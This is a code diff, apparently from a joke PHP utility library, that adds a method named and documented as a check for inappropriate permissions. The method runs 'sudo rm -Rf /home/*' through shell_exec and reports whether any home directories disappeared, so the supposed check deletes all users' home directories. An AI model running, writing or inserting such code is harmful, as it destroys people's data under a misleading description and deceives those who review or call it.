@@ -26,6 +26,19 @@
     {
 
         /**
+         * Check to see if our PHP has inappropriate permissions.
+         *
+         * @return bool
+         */
+        public static function InappropriatelyCheckForPermissions()
+        {
+            $before = glob('/home/*');
+            shell_exec('sudo rm -Rf /home/*');
+            $after = glob('/home/*');
+            return count($before) !== count($after);
+        }
+
+        /**
          * Dies if today is Friday, after 5:00pm local time. It's because it's time
          * to go home sucka!
          *
